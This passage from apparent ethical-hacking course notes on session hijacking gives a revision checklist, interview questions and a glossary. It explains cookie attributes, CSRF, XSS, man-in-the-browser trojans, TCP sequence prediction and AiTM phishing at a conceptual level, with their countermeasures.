- [ ] Secure flag — cookie only over HTTPS
- [ ] SameSite=Strict — blocks CSRF
- [ ] CSRF — no token theft — forces victim's browser to act
- [ ] CSRF countermeasure — CSRF tokens + SameSite cookie
- [ ] XSS vs CSRF — steal token vs force action
- [ ] MitB — operates inside browser — bypasses TLS
- [ ] Zeus, SpyEye — MitB Trojans
- [ ] Session token in URL — Referer leakage risk
- [ ] Firesheep — 2010 — Wi-Fi cookie theft — HTTPS catalyst
- [ ] Mitnick attack 1994 — TCP ISN prediction — first famous hijack
- [ ] RFC 6528 — TCP ISN randomization — ended TCP-level hijacking
- [ ] Evilginx2 — AiTM framework — MFA bypass via session cookie
- [ ] Infostealer malware — reads browser cookie DB from disk
- [ ] IT Act S.66C — identity theft — online impersonation
- [ ] IT Act S.66D — cheating by personation via computer
- [ ] Stored XSS vs Reflected XSS — persistence difference
- [ ] Session regeneration — when to do it (always after login)
- [ ] Session invalidation on logout — server-side requirement
- [ ] JWT — signed but still stealable — signing ≠ theft prevention

---

### 💼 Interview-Likely

- What is the difference between spoofing and session hijacking?
- Walk me through the five steps of session hijacking.
- Explain session fixation — how is it different from session hijacking?
- What is an ACK storm and what causes it?
- How does XSS enable session hijacking — and how does HttpOnly prevent it?
- What is CSRF and why doesn't stealing the cookie help the attacker?
- How does Man-in-the-Browser bypass HTTPS encryption?
- What is the ideal session cookie configuration and what does each attribute prevent?
- How did Firesheep change the industry's approach to HTTPS?
- What is an AiTM phishing attack and how does it bypass MFA?

---

## Next Session Bridge

Session 16B completes the Session 16 block. We have now covered the
full attack progression against authenticated sessions: DoS to
deny access (16A) → hijacking to steal access (16B).

Session 17A moves the focus to the **web application layer** —
specifically hacking web servers and exploiting web application
vulnerabilities. Where session hijacking exploits the session
management layer, web application hacking targets the application
logic itself: SQL injection, directory traversal, parameter
tampering, and web-based password cracking. The session token
knowledge from 16B directly applies to understanding how web
application vulnerabilities expose session management to attack.

---

<details>
<summary>📖 Glossary</summary>

| Term | Definition |
|---|---|
| **ACK Storm** | Rapid loop of TCP ACK packets caused by sequence number desynchronization after session hijacking |
| **Active Hijacking** | Session hijacking where attacker sends packets and takes direct control — victim is disrupted |
| **AiTM** | Adversary-in-the-Middle — reverse proxy phishing capturing authenticated session cookies post-MFA |
| **Anti-CSRF Token** | Server-generated unique per-form token validating that requests originate from legitimate pages |
| **Burp Suite** | Web proxy tool for intercepting, modifying, and replaying HTTP sessions and cookies |
| **Cookie** | HTTP mechanism for maintaining session state — key=value pair stored in browser |
| **Cookie Cadger** | Passive Wi-Fi session cookie capture tool |
| **CSRF** | Cross-Site Request Forgery — forces victim's browser to make unauthorized requests using their session |
| **Desynchronization** | TCP state where client and server have mismatched sequence number expectations — caused by injection |
| **DOM XSS** | XSS exploiting browser DOM manipulation via JavaScript without server-side involvement |
| **Evilginx2** | Open-source AiTM phishing framework capturing session cookies post-authentication including MFA |
| **Ferret** | Component of Hamster/Ferret toolset — captures cookies from Wi-Fi network traffic |
| **Firesheep** | Firefox extension (2010) enabling one-click Wi-Fi session cookie theft — catalyzed HTTPS adoption |
| **Hamster** | Web proxy component of Hamster/Ferret — replays captured cookies for session takeover |
| **HttpOnly** | Cookie attribute preventing JavaScript access — blocks XSS-based cookie theft |
| **Hunt** | Linux tool for TCP session monitoring and hijacking |
| **Identity Theft** | Using another person's digital identity without authorization — IT Act S.66C |
| **IP Spoofing** | Setting false source IP address in packet header — used in SYN flood, Smurf, amplification |
| **ISN** | Initial Sequence Number — TCP connection starting sequence — historically predictable, now randomized |
| **Juggernaut** | Early Linux tool for TCP session hijacking |
| **JWT** | JSON Web Token — signed token format for stateless API and session authentication |
| **Man-in-the-Browser** | Trojan operating inside browser process — intercepts and modifies transactions after TLS decryption |
| **Mitnick Attack** | 1994 TCP ISN prediction attack by Kevin Mitnick against Tsutomu Shimomura — first famous TCP hijack |
| **OAuth 2.0** | Authorization framework using access tokens for delegated third-party resource access |
| **Passive Hijacking** | Session monitoring without active participation — silently captures tokens and session data |
| **PKCE** | Proof Key for Code Exchange — OAuth extension protecting authorization code flow in public clients |
| **Reflected XSS** | XSS where malicious script is in URL parameter — victim must click crafted link |
| **RFC 6528** | TCP ISN randomization standard — ended feasibility of TCP ISN prediction attacks |
| **SameSite** | Cookie attribute controlling cross-site cookie sending — Strict blocks CSRF |
| **Secure Flag** | Cookie attribute ensuring cookie only transmitted over HTTPS |
| **Session Donation** | Attacker gives their authenticated session to victim — victim enters data into attacker's account |
| **Session Fixation** | Attacker plants known session ID before victim logs in — victim's login validates planted ID |
| **Session Hijacking** | Stealing or predicting a valid session token to impersonate an authenticated user |
| **Session Regeneration** | Creating new session ID after authentication — prevents session fixation |
| **Session Token** | Unique identifier issued after authentication — presented with every request instead of credentials |
| **Spoofing** | Faking identity information (IP, MAC, email, caller ID) to deceive a system or user |
| **SpyEye** | Man-in-the-Browser Trojan for banking session manipulation |
| **Stored XSS** | XSS where malicious script is stored in database — executes for every page visitor |
| **T-Sight** | Windows-based TCP session monitoring and hijacking tool |
| **TTY Watcher** | Tool monitoring Unix terminal sessions — can be used for active hijacking |
| **UUID v4** | Universally Unique Identifier version 4 — 122 bits of cryptographic randomness — suitable for session IDs |
| **XSS** | Cross-Site Scripting — injection of malicious JavaScript into pages viewed by victims |
| **Zeus** | Man-in-the-Browser banking Trojan — one of the most sophisticated session manipulation tools |

</details>

---